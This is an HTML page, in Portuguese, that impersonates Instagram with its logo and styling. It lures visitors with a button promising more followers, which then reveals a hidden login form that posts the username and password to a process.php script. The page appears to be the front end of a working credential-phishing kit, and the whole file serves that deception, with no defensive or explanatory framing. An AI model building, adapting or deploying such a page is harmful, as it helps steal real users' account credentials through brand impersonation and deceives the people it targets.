
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aumento de seguidores no Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            margin-bottom: 20px;
        }
        .button {
            display: block;
            width: 100%;
            padding: 10px 0;
            margin: 10px 0;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #3185d9;
        }
        .hidden {
            display: none;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Instagram Logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" width="120">

        <!-- Followers Increase Button -->
        <div id="welcomeSection">
            <h2>Aumente seus seguidores</h2>
            <p>Clique no botão abaixo para aumentar seus seguidores!</p>
            <button id="increaseFollowers" class="button">Aumentar Seguidores</button>
        </div>

        <!-- Hidden Login Form -->
        <div id="loginForm" class="hidden">
            <h2>Entre na sua conta</h2>
            <form action="process.php" method="POST">
                <input type="text" id="username" name="username" placeholder="Username" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login" class="button">
            </form>
        </div>
    </div>

    <script>
        // Show the login form when the button is clicked
        document.getElementById('increaseFollowers').addEventListener('click', function () {
            document.getElementById('welcomeSection').classList.add('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
        });
    </script>
</body>
</html>
